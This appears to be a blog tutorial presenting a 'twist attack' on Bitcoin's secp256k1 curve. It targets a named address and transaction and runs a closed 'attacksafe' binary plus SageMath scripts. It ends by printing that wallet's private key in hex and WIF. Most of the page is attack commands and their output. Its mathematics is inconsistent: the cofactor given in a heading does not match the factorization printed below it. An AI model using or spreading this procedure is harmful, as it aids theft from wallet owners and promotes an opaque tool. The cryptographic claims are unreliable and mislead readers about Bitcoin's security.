
# Twist Attack Example №2

---


---





<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/034-1024x576.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2357"></figure></div>


---


* Tutorial: https://youtu.be/pOviZOYItv4
* Tutorial: https://cryptodeeptech.ru/twist-attack-2

---

<hr class="wp-block-separator has-alpha-channel-opacity">



<p>In this article, we will implement a Twist Attack using example #2, according to&nbsp;<a href="https://cryptodeeptech.ru/twist-attack" target="_blank" rel="noreferrer noopener">the first theoretical part of the article,</a>&nbsp;we made sure that with the help of certain points on the secp256k1 elliptic curve, we can get partial values ​​​​of the private key and within 5-15 minutes restore a Bitcoin Wallet using the&nbsp;<a href="https://en.wikipedia.org/wiki/Pollard%27s_rho_algorithm_for_logarithms" target="_blank" rel="noreferrer noopener">“Sagemath pollard rho function : (discrete_log_rho)”</a>&nbsp;and&nbsp;<a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem" target="_blank" rel="noreferrer noopener">“Chinese Remainder Theorem”</a>&nbsp;.</p>



<blockquote class="wp-block-quote">
<p>Let’s continue with a series of ECC operations, since these certain points are maliciously chosen points on the secp256k1 elliptic curve</p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-13-1024x596.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2364"><figcaption class="wp-element-caption"><a href="https://github.com/christianlundkvist/blog/blob/master/2020_05_26_secp256k1_twist_attacks/secp256k1_twist_attacks.md" target="_blank" rel="noreferrer noopener">https://github.com/christianlundkvist/blog/blob/master/2020_05_26_secp256k1_twist_attacks/secp256k1_twist_attacks.md</a></figcaption></figure></div>


<p>According to Paulo Barreto tweet:&nbsp;<a href="https://twitter.com/pbarreto/status/825703772382908416?s=21" target="_blank" rel="noreferrer noopener">https://twitter.com/pbarreto/status/825703772382908416?s=21</a></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-2-1024x706.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2079"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>The cofactor is 3^2*13^2*3319*22639</h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-3-1024x710.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2082"></figure></div>


<pre class="wp-block-code"><code>E1: 20412485227
E2: 3319, 22639
E3: 109903, 12977017, 383229727
E4: 18979
E6: 10903, 5290657, 10833080827, 22921299619447

prod = 20412485227 * 3319 * 22639 *109903 * 12977017 * 383229727 * 18979 * 10903 * 5290657 * 10833080827 * 22921299619447

38597363079105398474523661669562635951234135017402074565436668291433169282997 = 3 * 13^2 * 3319 * 22639 * 1013176677300131846900870239606035638738100997248092069256697437031

HEX:0x55555555555555555555555555555555C1C5B65DC59275416AB9E07B0FEDE7B5

</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p>When running&nbsp;<a href="https://cryptodeeptech.ru/twist-attack/">a Twist Attack</a>&nbsp;, the “private key” can be obtained by a certain choice of the “public key” (selected point of the secp256k1 elliptic curve), that is, the value in the transaction is revealed.After that, information about the private key will also be revealed, but for this you need to perform several ECC operations.</p>
</blockquote>



<pre class="wp-block-code"><code>E1: y^2 = x^3 + 1
E2: y^2 = x^3 + 2
E3: y^2 = x^3 + 3
E4: y^2 = x^3 + 4
E6: y^2 = x^3 + 6</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://attacksafe.ru/twist-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-4-1.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2086"></a><figcaption class="wp-element-caption"><code><a href="https://attacksafe.ru/twist-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener">https://attacksafe.ru/twist-attack-on-bitcoin</a></code></figcaption></figure></div>


<pre class="wp-block-code"><code>y² = x³ + ax + b. In the Koblitz curve,
y² = x³ + 0x + 7. In the Koblitz curve,
0  = x³ + 0  + 7
b '= -x ^ 3 - ax.</code></pre>



<blockquote class="wp-block-quote">
<p>All points&nbsp;<code>(x, 0)&nbsp;</code>fall on invalid curves with&nbsp;<code>b '= -x ^ 3 - ax</code></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s move on to the experimental part:</h2>



<p><em>(Consider a Bitcoin Address)</em></p>



<blockquote class="wp-block-quote">
<p><a href="https://btc1.trezor.io/address/1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx" target="_blank" rel="noreferrer noopener"><strong>1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx</strong></a></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><em>(Now consider critical vulnerable transactions)</em></p>



<blockquote class="wp-block-quote">
<p><a href="https://btc1.trezor.io/tx/60918fd82894eb94c71a9c10057ffe9d8a82074426f596dcbc759d676c886ae9">https://btc1.trezor.io/tx/60918fd82894eb94c71a9c10057ffe9d8a82074426f596dcbc759d676c886ae9</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-1-1024x196.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2325"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Open&nbsp;&nbsp;<strong><a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener">[TerminalGoogleColab]</a></strong>&nbsp;.</p>



<p>Implementing the&nbsp;<a href="https://attacksafe.ru/twist-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>Twist Attack</strong></a>&nbsp;algorithm using our&nbsp;<a href="https://github.com/demining/CryptoDeepTools/tree/main/18TwistAttack" target="_blank" rel="noreferrer noopener"><strong>18TwistAttack repository</strong></a></p>



<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/18TwistAttack/

ls</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-6-1024x477.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2108"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Install all the packages we need</h2>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-11.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-687"></figure>



<p><strong><code>requirements.txt</code></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>sudo apt install python2-minimal

wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

sudo python2 get-pip.py

pip2 install -r requirements.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-7-1024x445.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2113"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-8-1024x440.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2115"></figure>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-9-1024x340.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2116"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-10-1024x452.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2117"><figcaption class="wp-element-caption">,</figcaption></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-11-1024x453.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2118"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><a href="https://btc1.trezor.io/address/1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx" target="_blank" rel="noreferrer noopener"><strong>1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx</strong></a></p>



<p><a href="https://btc1.trezor.io/tx/60918fd82894eb94c71a9c10057ffe9d8a82074426f596dcbc759d676c886ae9">https://btc1.trezor.io/tx/60918fd82894eb94c71a9c10057ffe9d8a82074426f596dcbc759d676c886ae9</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-2-1024x286.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2328"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>RawTX = 01000000013edba424d1b614ec2182c8ac6856215afb803bcb9748c1888eecd35fffad67730e0000006b483045022100bbabd1cb2097e0053b3da453b15fd195a2bc1e8dbe00cfd60aee95b404d2abfa02201af66956a7ea158d32b0a56a46a83fe27f9e544387c8d0ce13cd2a54dba9a747012102912cd095d2c20e4fbdb20a8710971dd040a067dba45899b7156e9347efc20312ffffffff01a8020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000</code></pre>



<h2>Save in file: RawTX.txt</h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-14-1024x227.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2369"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong></strong>&nbsp;<strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener">To implement the attack, we will use the “ATTACKSAFE SOFTWARE”</a></strong><strong>&nbsp;software</strong><strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"></a></strong></p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-14.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-705"></a><figcaption class="wp-element-caption"><strong><code>www.attacksafe.ru/software</code></strong></figcaption></figure></div>


<h2>Access rights:</h2>



<pre class="wp-block-code"><code>chmod +x attacksafe</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-14(1).png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2134"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Application:</h2>



<pre class="wp-block-code"><code>./attacksafe -help</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-15.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2136"></figure></div>


<pre class="wp-block-code"><code>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -version</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-17.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2144"><figcaption class="wp-element-caption"><code>Version 5.3.2. [ATTACKSAFE SOFTWARE, © 2023]</code></figcaption></figure></div>


<p><code>"ATTACKSAFE SOFTWARE"</code>&nbsp;includes all popular attacks on Bitcoin.</p>



<h2>Let’s run a list of all attacks:</h2>



<pre class="wp-block-code"><code>./attacksafe -list</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-18.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2147"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-19.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2149"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-20.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2151"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-21.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2154"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s choose<code>&nbsp;-tool: twist_attack</code></p>



<p>To get specific secp256k1 points from the vulnerable ECDSA signature transaction, we added the data&nbsp;&nbsp;<code>RawTX</code>&nbsp;to a text document and saved it as a file&nbsp;<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>01000000013edba424d1b614ec2182c8ac6856215afb803bcb9748c1888eecd35fffad67730e0000006b483045022100bbabd1cb2097e0053b3da453b15fd195a2bc1e8dbe00cfd60aee95b404d2abfa02201af66956a7ea158d32b0a56a46a83fe27f9e544387c8d0ce13cd2a54dba9a747012102912cd095d2c20e4fbdb20a8710971dd040a067dba45899b7156e9347efc20312ffffffff01a8020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;&nbsp;<code>-tool twist_attack</code>&nbsp;using software&nbsp;<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool twist_attack -open RawTX.txt -save SecretPoints.txt</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-3-1024x304.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2330"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-4-1024x262.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2332"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>We launched this attack from&nbsp;&nbsp;<code>-tool twist_attack</code>&nbsp;and the result was saved to a file&nbsp;<code>SecretPoints.txt</code></p>



<p>Now to see the successful result, open the file&nbsp;<code>SecretPoints.txt</code></p>



<pre class="wp-block-code"><code>cat SecretPoints.txt</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Result:</h2>



<pre class="wp-block-code"><code>Elliptic Curve Secret Points:

Q11 = E1([97072073026593516785986136148833105674452542501015145216961054272876839453879, 107567253371779495307521678088935176637661904239924771700494716430774957820966])
Q21 = E2([3350296768277877304391506547616361976369787138559008027651808311357100316617, 72988900267653266243491077449097157591503403928437340215197819240911749073070])
Q22 = E2([112520741232779465095566100761481226712887911875949213866586208031790667764851, 67821409607391406974451792678186486803604797717916857589728259410989018828088])
Q31 = E3([19221018445349571002768878066568778104356611670224206148889744255553888839368, 51911948202474460182474729837629287426170495064721963100930541018009108314113])
Q32 = E3([41890177480111283990531243647299980511217563319657594412233172058507418746086, 50666391602993122126388747247624601309616370399604218474818855509093287774278])
Q33 = E3([42268931450354181048145324837791859216268206183479474730830244807012122440868, 106203099208900270966718494579849900683595613889332211248945862977592813439569])
Q41 = E4([54499795016623216633513895020095562919782606390420118477101689814601700532150, 105485166437855743326869509276555834707863666622073705127774354124823038313021])
Q61 = E6([62124953527279820718051689027867102514830975577976669973362563656149003510557, 100989088237897158673340534473118617341737987866593944452056172771683426720481])
Q62 = E6([86907281605062616221251901813989896824116536666883529138776205878798949076805, 19984923138198085750026187300638434023309806045826685297245727280111269894421])
Q63 = E6([66063410534588649374156935204077330523666149907425414249132071271750455781006, 25315648259518110320341360730017389015499807179224601293064633820188666088920])
Q64 = E6([109180854384525934106792159822888807664445139819154775748567618515646342974321, 102666617356998521143219293179463920284010473849613907153669896702897252016986])


RawTX = 01000000013edba424d1b614ec2182c8ac6856215afb803bcb9748c1888eecd35fffad67730e0000006b483045022100bbabd1cb2097e0053b3da453b15fd195a2bc1e8dbe00cfd60aee95b404d2abfa02201af66956a7ea158d32b0a56a46a83fe27f9e544387c8d0ce13cd2a54dba9a747012102912cd095d2c20e4fbdb20a8710971dd040a067dba45899b7156e9347efc20312ffffffff01a8020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000

</code></pre>



<h2>Now let’s add the received secp256k1 points</h2>



<p>To do this, open&nbsp;<code><em>Python</em>-script:</code>&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/bbd83042e7405508cd2e646ad1b0819da0f9c58d/18TwistAttack/discrete.py#L51" target="_blank" rel="noreferrer noopener"><strong>discrete.py</strong></a></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-5-1024x371.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2334"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To run&nbsp;<code><em>Python</em>-script:</code>&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/bbd83042e7405508cd2e646ad1b0819da0f9c58d/18TwistAttack/discrete.py#L51" target="_blank" rel="noreferrer noopener"><strong>discrete.py</strong></a>&nbsp;install&nbsp;<strong><a href="https://www.sagemath.org/" target="_blank" rel="noreferrer noopener">SageMath</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-27.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2188"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-28-1024x445.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2189"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Installation command:</h2>



<pre class="wp-block-code"><code>sudo apt-get update
sudo apt-get install -y python3-gmpy2
yes '' | sudo env DEBIAN_FRONTEND=noninteractive apt-get -y -o DPkg::options::="--force-confdef" -o DPkg::options::="--force-confold" install sagemath</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-31-1024x422.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2201"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-32-1024x406.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2202"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-33-1024x401.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2204"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Check the installation of&nbsp;<strong><a href="https://www.sagemath.org/" target="_blank" rel="noreferrer noopener">SageMath</a></strong>&nbsp;by command:&nbsp;<a href="https://cryptodeep.ru/twist-attack/" target="_blank" rel="noreferrer noopener">sage -v</a></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-34.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2208"><figcaption class="wp-element-caption"><code>SageMath&nbsp;version&nbsp;9.0</code></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To solve the discrete logarithm&nbsp;<em><code>(Pollard's rho algorithm for logarithms)</code></em>run&nbsp;<code>Python-script:</code>&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/bbd83042e7405508cd2e646ad1b0819da0f9c58d/18TwistAttack/discrete.py" target="_blank" rel="noreferrer noopener">discrete.py</a></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-35-1024x520.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2210"></figure></div>


<h2>Run command:</h2>



<pre class="wp-block-code"><code>sage -python3 discrete.py</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-7.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2339"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Result:</h2>



<pre class="wp-block-code"><code>Discrete_log_rho:

14996641256
1546
19575
31735
9071789
145517682
11552
7151
3370711
10797447604
10120546250224

PRIVATE KEY:

3160389728152122137789469305939632411648887242506549174582525524562820572318</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>privkey = crt([x11, x21, x22, x31, x32, x33, x41, x61, x62, x63, x64], [ord11, ord21, ord22, ord31, ord32, ord33, ord41, ord61, ord62, ord63, ord64])
</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p>We solved the discrete logarithm and using the “&nbsp;<em>Chinese Remainder Theorem</em>&nbsp;<code>(Chinese remainder theorem)</code>&nbsp;” got the private key in decimal format.</p>
</blockquote>



<h2>Convert private key to HEX format</h2>



<p><em>The decimal format of the private key has been saved to a file:</em>&nbsp;<code>privkey.txt</code></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-8.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2342"></figure></div>


<h2>Run Python-script:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/18TwistAttack/privkey2hex.py" target="_blank" rel="noreferrer noopener">privkey2hex.py</a></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-38.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2230"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>python3 privkey2hex.py
cat privkey2hex.txt</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-9.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2344"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><em>Let’s open the resulting file:</em>&nbsp;<code>privkey2hex.txt</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-10.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2345"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Private key in HEX format:</p>



<p><code>PrivKey = 06fcb79a2eabffa519509e43b7de95bc2df15ca48fe6be29f9160bcd6ac1a49e</code></p>



<p>Let’s open&nbsp;&nbsp;<strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>&nbsp;&nbsp;and check:</p>



<pre class="wp-block-code"><code>ADDR: 1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx
WIF:  KwTHx3AhV8qiN6qyfG1D85TGEeUBiaMUjnQ11eVLP5NAfiVNLLmS
HEX:  06FCB79A2EABFFA519509E43B7DE95BC2DF15CA48FE6BE29F9160BCD6AC1A49E</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-41-2.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2348"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><iframe src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/saved_resource.html" style="overflow:hidden;" frameborder="0"></iframe></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://live.blockcypher.com/btc/address/1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx/">https://live.blockcypher.com/btc/address/1L7vTvRwmWENJm4g15rAxAtGcXjrFsWcBx/</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
